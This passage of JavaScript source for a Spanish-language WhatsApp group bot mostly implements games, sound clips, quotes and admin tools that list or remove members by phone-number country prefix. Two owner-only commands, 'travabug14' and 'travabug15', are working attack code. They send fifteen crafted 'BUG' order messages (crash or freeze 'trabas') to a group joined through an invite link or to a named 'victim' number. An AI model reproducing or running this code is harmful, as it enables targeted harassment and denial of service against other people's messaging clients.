enviar('[👑] 𝙻𝙰𝙽𝚉𝙰𝙽𝙳𝙾 𝙼𝙾𝙽𝙴𝙳𝙰, 𝚂𝙸 𝚂𝙰𝙻𝙴 𝙲𝙰𝚁𝙰, 𝙶𝙰𝙽𝙰𝚂. [👑]\n\n [🚀] 𝚂𝚄𝙴𝚁𝚃𝙴!!')
cararo = ["cara", "sello"]
fej = cararo[Math.floor(Math.random() * cararo.length)]
gg = fej
cararoa = fs.readFileSync('./archivos/juegos/'+fej+'.webp')
if ( fej == "cara"){
setTimeout(async() => {
const finCarew4 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐀/ 𝐒𝐄𝐋𝐋𝐎 ⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${fej}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
enviar(finCarew4)
}, 5000)
}
else if(fej == "sello"){ 
setTimeout(async() => {
const finCarew5 = `
╭━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐀/ 𝐒𝐄𝐋𝐋𝐎 ⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${fej}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
`
sock.sendMessage(from,{ text : finCarew5}, { quoted : info})
gettCoins(sender,1)
}, 5000)
}
setTimeout(async() => {
sock.sendMessage(from,{ sticker:  cararoa}, {quoted: info})
}, 3000)
break
case 'carasello2': case "caraosello2":
enviar('[👑] 𝙻𝙰𝙽𝚉𝙰𝙽𝙳𝙾 𝙼𝙾𝙽𝙴𝙳𝙰 [👑]\n\n [🚀] 𝚂𝚄𝙴𝚁𝚃𝙴!!')
const cara2 = fs.readFileSync('./archivos/juegos/cara.webp');
const sello2 = fs.readFileSync('./archivos/juegos/sello.webp');
cararo2 = ["cara", "sello"]
cararo3 = ["cara", "sello"]
fej2 = cararo2[Math.floor(Math.random() * cararo2.length)]
fej3 = cararo2[Math.floor(Math.random() * cararo2.length)]
gg2 = fej2
cararoa2 = fs.readFileSync('./archivos/juegos/'+fej2+'.webp')
cararoa3 = fs.readFileSync('./archivos/juegos/'+fej3+'.webp')
if ( fej2 == "cara" && fej3 == "sello"){
setTimeout(async() => {
const finCarew = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐀/ 𝐒𝐄𝐋𝐋𝐎 ⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${fej2}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text : finCarew} , { quoted : info})
}, 7000)
}
else if(fej2 == "sello" && fej3 == "cara"){ 
setTimeout(async() => {
const finCare = `
╭━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐀/ 𝐒𝐄𝐋𝐋𝐎 ⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${fej2}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :finCare}, { quoted : info})
gettCoins(sender,1)
}, 7000)
}
else if(( fej2 == "cara" && fej3 == "cara") || ( fej2 == "sello" && fej3 == "sello")) {
setTimeout(async() => {
const finCare3 = `
╭━⊷ 𝐄𝐌𝐏𝐀𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐀/ 𝐒𝐄𝐋𝐋𝐎 ⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${fej2}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐄𝐌𝐏𝐀𝐓𝐄
`
sock.sendMessage(from,{ text : finCare3}, { quoted :info})
}, 7000)
}
setTimeout(async() => {
enviar(`[🕹] *Jugada de ${pushname}*`)
sock.sendMessage(from,{ sticker:  cararoa2}, {quoted: info})
}, 3000)
setTimeout(async() => {
enviar("[🕹] *Jugada del Bot*")
sock.sendMessage(from,{ sticker:  cararoa3}, {quoted: info})
}, 5000)
break

case 'jogodavelha': case "3rayas": case "3enraya":
joguinhodavelhajs.push(sender)
fs.writeFileSync('./archivos/juegos/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.push(from)
fs.writeFileSync('./archivos/juegos/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
if (fs.existsSync(`./archivos/juegos/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*🎮𝐓𝐑𝐄𝐒 𝐑𝐀𝐘𝐀𝐒̸??️*
     
[❗] Alguien esta jugando espere un momento Porfavor...\n\n@${boardnow.X} VS @${boardnow.O}
     
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
     
 Su turno : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
sock.sendMessage(from, {text: chatMove}, {quoted: info,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return enviar(`*⟅❗⟆ Juegue con Alguien!!!!*
*para inicar la partida : ${comando} @mienbro del grupo*`);
const boardnow = setGame(`${from}`);
console.log(`Inicio del juego 3 en rayas ${boardnow.session}`);
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
fs.writeFileSync(`./archivos/juegos/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const strChat = `*『📌ᎬՏᏢᎬᎡᎪΝᎠϴ ϴᏢϴΝᎬΝͲᎬ⚔️』*
     
@${sender.replace("@s.whatsapp.net",
"")} _Te está desafiando para una partida del juego de 3 en rayas..._
_[ ${argss[1]} ] Use *『S』* para aceptar o *『N』* para no aceptar..._
     `;
sock.sendMessage(from, {text: strChat}, {quoted: info,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});
break

case 'resetarvelha': case 'resetavelha':  case 'resetarv': case 'resetav': case 'resetvelha': case 'rv': 
if (!isJoguin && !isGroupAdmins) return enviar(`hable con quien empezo el juego para reiniciar o algun admin`)
if (fs.existsSync("./archivos/juegos/" + from + ".json")) {
fs.unlinkSync("./archivos/juegos/" + from + ".json");
enviar(`Juego de 3 en rayas reseteado!`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
enviar(`No encontre sesión abierta`);
}
break
case 'antifake':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(`[❗] Digite .antifake 1 para activar o .antifake 0 para desactivar`)
if (Number(args[0]) === 1) {
if (isAntifake) return enviar('[❌️]Ya está activo')
antifake.push(from)
fs.writeFileSync('./archivos/antis/antifake.json', JSON.stringify(antifake))
enviar('[✅️] Activado' )
} else if (Number(args[0]) === 0) {
if (!isAntifake) return enviar('[❌️]Ya está desactivado')
pesquisar = from
processo = antifake.indexOf(pesquisar)
while(processo >= 0){
antifake.splice(processo, 1)
processo = antifake.indexOf(pesquisar)
}
fs.writeFileSync('./archivos/antis/antifake.json', JSON.stringify(antifake))
enviar('[✅️] Desactivado' )
} else {
enviar(`[❗] Digite .antifake 1 para activar o .antifake 0 para desactivar`)
}
break
case "anagrama":
if(!isGroup) return enviar(respuesta.grupos)
let namequiz = Math.floor(Math.random() * anagramaok.length)
if(q =="on") {     
if(fs.existsSync(`./archivos/juegos/anagramaok-${from}.json`)) {
let dataAna = JSON.parse(fs.readFileSync(`./juegos/anagramaok-${from}.json`))
const anaDd =`
╭━⊷ 𝗣𝗜𝗦𝗧𝗔
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎 ⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝗣𝗜𝗦𝗧𝗔 : ${dataAna.pista}
╿║ ➪ 𝙋𝘼𝙇𝘼𝘽𝙍𝘼 : ${dataAna.fake}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝗣𝗜𝗦𝗧𝗔
`
enviar(anaDd)
} else {
enviar(`[🕹] Creando Database del Juego\nVuelve a digitar el comando Porfavor : diferencias on`)
fs.writeFileSync(`./archivos/juegos/anagramaok-${from}.json`, `${JSON.stringify(anagramaok[namequiz])}`)
}
} else if(q == "off") {
if(!fs.existsSync(`./archivos/juegos/anagramaok-${from}.json`)) return enviar('⛔️ 𝗡𝗢 𝗘𝗦𝗧𝗔 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢 𝗔𝗨𝗡')
fs.unlinkSync(`./archivos/juegos/anagramaok-${from}.json`)
enviar("⛔️ 𝐀𝐃𝐈𝐕𝐈𝐍𝐀 𝐄𝐋 𝐍𝐎𝐌𝐁𝐑𝐄 𝐃𝐄𝐒𝐀𝐂𝐓𝐈𝐕𝐀𝐃𝐎")
} else if(q == "revelar") {     
let dataAna = JSON.parse(fs.readFileSync(`./archivos/juegos/anagramaok-${from}.json`))
const textiPp = await getBuffer(dataAna.original)
enviar(textiPp)
} else {
fs.writeFileSync(`./archivos/juegos/anagramaok-${from}.json`, `${JSON.stringify(anagramaok[namequiz])}`)
enviar("⛔️ *Digite .anagrama on Para empezar a Jugar, .anagrama off Para apagarlo y .anagrama revelar para hacer trampa* ")
}
break
case 'sound1': case 'sound2':case 'sound3':case 'sound4':case 'sound5':case 'sound6':case 'sound7':case 'sound8':case 'sound9':case 'sound10':case 'sound11':case 'sound12':case 'sound13':case 'sound14':case 'sound15':case 'sound16':case 'sound17':case 'sound18':case 'sound19':case 'sound20':case 'sound21':case 'sound22':case 'sound23':case 'sound24':case 'sound25':case 'sound26':case 'sound27':case 'sound28':case 'sound29':case 'sound30':case 'sound31':case 'sound32':case 'sound33':case 'sound34':case 'sound35':case 'sound36':case 'sound37':case 'sound38':case 'sound39':case 'sound40':case 'sound41':case 'sound42':case 'sound43':case 'sound44':case 'sound45':case 'sound46':case 'sound47':case 'sound48':case 'sound49':case 'sound50':case 'sound51':case 'sound52':case 'sound53':case 'sound54':case 'sound55':case 'sound56':case 'sound57':case 'sound58':case 'sound59':case 'sound60':case 'sound61':case 'sound62':case 'sound63':case 'sound64':case 'sound65':case 'sound66':case 'sound67':case 'sound68':case 'sound69':case 'sound70':case 'sound71':case 'sound72':case 'sound73':case 'sound74':case 'sound75':case 'sound76':case 'sound77':case 'sound78':case 'sound79':case 'sound80':case 'sound81':case 'sound82':case 'sound83':case 'sound84':case 'sound85':case 'sound86':case 'sound87':case 'sound88':case 'sound89':case 'sound90':case 'sound91':case 'sound92':case 'sound93':case 'sound94':case 'sound95':case 'sound96':case 'sound97':case 'sound98':case 'sound99':case 'sound100':case 'sound101':case 'sound102':case 'sound103':case 'sound104':case 'sound105':case 'sound106':case 'sound107':case 'sound108':case 'sound109':case 'sound110':case 'sound111':case 'sound112':case 'sound113':case 'sound114':case 'sound115':case 'sound116':case 'sound117':case 'sound118':case 'sound119':case 'sound120':case 'sound121':case 'sound122':case 'sound123':case 'sound124':case 'sound125':case 'sound126':case 'sound127':case 'sound128':case 'sound129':case 'sound130':case 'sound131':case 'sound132':case 'sound133':case 'sound134':case 'sound135':case 'sound136':case 'sound137':case 'sound138':case 'sound139':case 'sound140':case 'sound141':case 'sound142':case 'sound143':case 'sound144':case 'sound145':case 'sound146':case 'sound147':case 'sound148':case 'sound149':case 'sound150':case 'sound151':case 'sound152':case 'sound153':case 'sound154':case 'sound155':case 'sound156':case 'sound157':case 'sound158':case 'sound159':case 'sound160':case 'sound161': 
if(!isGroup) return enviar(respuesta.grupos) 
enviar("🔈 Enviando Sound")
XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${comando}.mp3`)
try{
await sock.sendMessage(from, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: info })     
} catch {
enviar("error en la api")
}
break
case 'listape':
if(!isGroup) return enviar(respuesta.grupos)
if(!isBotGroupAdmins) return enviar('[❌️] Para que este comando funcione , el bot debe ser admin')
if(!isGroupAdmins) return enviar('[❌️] No eres Administrador')
teks = '[🇵🇪] 𝙋𝙀𝙍𝙐𝘼𝙉𝙊𝙎 𝙀𝙉 𝙀𝙇 𝙂𝙍𝙐𝙋𝙊\n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(51)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return enviar('[🇵🇪] *NINGUN NÚMERO DE PERÚ FUE ENCONTRADO* [🇵🇪]')
sock.sendMessage(from, {text: teks, mentions: men})
break


case 'listamundial': case "listapais": case "listaddd":
if(!isGroup) return enviar(respuesta.grupos)
if(!isBotGroupAdmins) return enviar('[❌️] Para que este comando funcione , el bot debe ser admin')
if(!isGroupAdmins) return enviar('[❌️] No eres Administrador')
if(!q) return await (' [❌️] *Digite el codigo de pais a buscar* ')
teks = '[🌏] 𝗟𝗜𝗦𝗧𝗔 𝗠𝗨𝗡𝗗𝗜𝗔𝗟 [🌏]\n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(`${q}`)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return enviar('[🌏] *NINGUN NÚMERO CON ESE PREFIJO FUE ENCONTRADO* [🌏]')
sock.sendMessage(from, {text: teks, mentions: men})
break
case 'listafake': case "listafake1":
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
teks = '[🕞] 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 [🕞]\n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(1)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return enviar('[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 𝘼𝙌𝙐𝙄')
sock.sendMessage(from, {text: teks, mentions: men})
break
case 'listafake2':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
teks = '[🕞] 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 [🕞]\n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(2)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return enviar('[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 𝘼𝙌𝙐𝙄')
sock.sendMessage(from, {text: teks, mentions: men})
break

case 'listafake3':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
teks = '[🕞] 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 [🕞]\n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(3)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return enviar('[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 𝘼𝙌𝙐𝙄')
sock.sendMessage(from, {text: teks, mentions: men})
break
case 'listafake4':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
teks = '[🕞] 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 [🕞]\n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(4)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return enviar('[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 𝘼𝙌𝙐𝙄')
sock.sendMessage(from, {text: teks, mentions: men})
break

case 'listafake5':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
teks = '[🕞] 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 [🕞]\n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(6)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return enviar('[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎')
sock.sendMessage(from, {text: teks, mentions: men})
break
case 'listafake6':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
teks = '[🕞] 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎 [🕞]\n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(7)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return enviar('[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎')
sock.sendMessage(from, {text: teks, mentions: men})
break
case 'travabug14' :  {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
if(!isGroup) return enviar(respuesta.grupos) 
 if (!args[0]) return enviar(`Uselo asi : .travabug14 https://chat.whatsapp.com/JRePIosUuuG7wiU9ZY2Sy0`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await sock.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `📉𝙈𝙄𝙉𝙄 𝙅𝙐𝙇𝙎𝘾𝙄𝙏𝙊`,
"orderTitle": " BUG BUG", 
"sellerJid": "32460220392@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted: info})
sock.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
}
enviar(`*Trabas enviadas a ${xeongc} Haga una pausa de 3 minutos*`)
break
case 'travabug15': {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")  
if(!isGroup) return enviar(respuesta.grupos) 
 if (!args[0]) return enviar(`Uselo asi : .travabug15 519890978189`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": fotoMenu,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `📉 𝙈𝙄𝙉𝙄 𝙅𝙐𝙇𝙎𝘾𝙄𝙏𝙊`,
"orderTitle": " BUG BUG BUG ", 
"sellerJid": "32460220392@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted: info})
sock.relayMessage(victim, order.message, { messageId: order.key.id })
}
enviar(`*Trabas enviadas correctamente a ${victim} Haga una pausa de 3 minutos*`)
}
break
case 'kickfake':case 'banfake': case "kitfake":
{
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
array_fake = [];
for(let a of groupMembers) {
if(a.id.startsWith("1") && a.id !== BotNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return enviar("[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎")
for(let a of array_fake) {
await sleep(100)
sock.groupParticipantsUpdate(from, [a], 'remove')
}
teks = `${array_fake.length} *Números fakes eliminados del grupo*`
sock.sendMessage(from, {text: teks, mentions: array_fake})
}
break
case 'kickfake2':case 'banfake2': case "kitfake2":
{
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
array_fake = [];
for(let a of groupMembers) {
if(a.id.startsWith("2") && a.id !== BotNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return enviar("[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎")
for(let a of array_fake) {
await sleep(100)
sock.groupParticipantsUpdate(from, [a], 'remove')
}
teks = `${array_fake.length} *Números fakes eliminados del grupo*`
sock.sendMessage(from, {text: teks, mentions: array_fake})
}
break

case 'kickfake3':case 'banfake3': case "kitfake3":
{
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
array_fake = [];
for(let a of groupMembers) {
if(a.id.startsWith("3") && a.id !== BotNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return enviar("[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎")
for(let a of array_fake) {
await sleep(100)
sock.groupParticipantsUpdate(from, [a], 'remove')
}
teks = `${array_fake.length} *Números fakes eliminados del grupo*`
sock.sendMessage(from, {text: teks, mentions: array_fake})
}
break
case 'kickfake5':case 'banfake4': case "kitfake4":
{
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
array_fake = [];
for(let a of groupMembers) {
if(a.id.startsWith("4") && a.id !== BotNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return enviar("[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎")
for(let a of array_fake) {
await sleep(100)
sock.groupParticipantsUpdate(from, [a], 'remove')
}
teks = `${array_fake.length} *Números fakes eliminados del grupo*`
sock.sendMessage(from, {text: teks, mentions: array_fake})
}
break
case 'kickfake5':case 'banfake5': case "kitfake5":
{
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
array_fake = [];
for(let a of groupMembers) {
if(a.id.startsWith("6") && a.id !== BotNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return enviar("[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎")
for(let a of array_fake) {
await sleep(100)
sock.groupParticipantsUpdate(from, [a], 'remove')
}
teks = `${array_fake.length} *Números fakes eliminados del grupo*`
sock.sendMessage(from, {text: teks, mentions: array_fake})
}
break
case 'kickfake6':case 'banfake6': case "kitfake6":
{
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
array_fake = [];
for(let a of groupMembers) {
if(a.id.startsWith("7") && a.id !== BotNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return enviar("[❌️] 𝙉𝙊 𝙃𝘼𝙔 𝙉𝙐𝙈𝙀𝙍𝙊𝙎 𝙁𝘼𝙆𝙀𝙎")
for(let a of array_fake) {
await sleep(100)
sock.groupParticipantsUpdate(from, [a], 'remove')
}
teks = `${array_fake.length} *Números fakes eliminados del grupo*`
sock.sendMessage(from, {text: teks, mentions: array_fake})
}
break
case 'frasebonita':	
                    rate = body.slice(6)
					var foda =['Vivir en paz es un lujo. Es saber que, a pesar de las dificultades, mantenerse bien es una prioridad. ✨','Somos herramientas para que la vida avance. 🌎','En lugar de pensar en las marcas que te deja la vida, reflexiona: ¿Qué marcas estás dejando en la vida? 💭','Sigue tu corazón, todo saldrá bien. ♥️','¡Permítete sentir todo lo que hay dentro de ti! ✨','Cada etapa de la vida exigirá una versión más fuerte de ti. 🍃','La vida es como una rosa, cada pétalo un sueño, cada espina una realidad🌷🙉','El arma de los débiles es criticar a los fuertes. ¡El arma de los fuertes es ignorar a los débiles!👌','Deja de mirar atrás. Ya sabes donde has estado, ahora necesitas saber a donde vas🌙🍃','Solo tiene sentido lo que te hace sentir.','La felicidad es sólo una cuestión de ser.','Cree: siempre hay algo bueno reservado para ti','Céntrate en lo que buscas, no en lo que dejas atrás.','La vida es demasiado corta para no hacerlo. ¡vive sonriendo ahí fuera!','¡Donde hay ganas, hay posibilidades de éxito!','¡Baila a tu propio ritmo! 💃','Solo tú sabes lo que te hará feliz','No te estreses por lo que está fuera de tu control','Aprende a apreciar los giros y vueltas que da el mundo','Empieza a amarte a ti mismo. Lo demás vendrá después.','¡Mayor que la tristeza de no haber vencido es la vergüenza de no haber luchado!','Reciprocidad, para las cosas buenas. Inmunidad, para las cosas malas.','Coraje, a la vida le gustan las personas valientes.','Comparte tus sentimientos. No todas las personas saben adivinar','Sigue caminando, está bien si vas despacio','¡Es mejor amar que estar amargado!','No corregir nuestros errores es lo mismo que cometer nuevos errores','Cuando el camino se vuelve difícil, sólo los duros siguen caminando','¡Para florecer hay que pasar por todas las estaciones!','Cuando las cosas simples parecen especiales, te das cuenta de lo buena que puede ser la vida.','Los aprendizajes hacen que la vida sea especial.' ,'Feliz aquel que encuentra el amor verdadero sin las cicatrices de la decepción']
					var zaltin = foda[Math.floor(Math.random() * foda.length)]
					sock.sendMessage(from,{ text : zaltin }, {quoted : info})
					break
case "hoy":
					var fodax =['☀️Hoy es un dia muy hermoso para enpezar agradecer a Dios','🌏 Hoy es un dia de bendicion para ti', '☀️Hoy es momento para empezar de nuevo','☀️Hoy empezamos de cero','☀️ Hoy es nuestro dia para sonreir','☀️Hoy es momento de reir','☀️ Hoy es nuestro dia de suerte','☀️Hoy es un dia para descansar','☀️ Hoy es un dia para agradecer a Dios por la vida','🌏Hoy es un dia para triunfar']
					var zaltinx = fodax[Math.floor(Math.random() * fodax.length)]
					sock.sendMessage(from,{ text : zaltinx }, {quoted : info})
break
case 'conciencia': 
                    rate = body.slice(6)
